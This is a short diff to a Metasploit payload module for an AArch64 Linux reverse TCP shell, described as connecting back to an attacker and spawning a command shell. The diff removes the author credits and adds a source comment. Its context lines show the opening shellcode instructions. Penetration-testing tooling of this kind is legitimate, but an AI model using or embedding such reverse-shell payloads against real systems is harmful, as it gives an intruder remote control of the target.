@@ -19,11 +19,6 @@ module MetasploitModule
     super(merge_info(info,
       'Name'          => 'Linux Command Shell, Reverse TCP Inline',
       'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        =>
-        [
-          'hyln9', # Virgil Hou
-          'timwr'
-        ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
       'Arch'          => ARCH_AARCH64,
@@ -38,6 +33,7 @@ module MetasploitModule
             },
           'Payload' =>
             [
+            # Generated from external/source/shellcode/linux/aarch64/single_reverse_tcp_shell.s
             0xd2800040,          #  mov	x0, #0x2                   	// #2
             0xd2800021,          #  mov	x1, #0x1                   	// #1
             0xd2800002,          #  mov	x2, #0x0                   	// #0
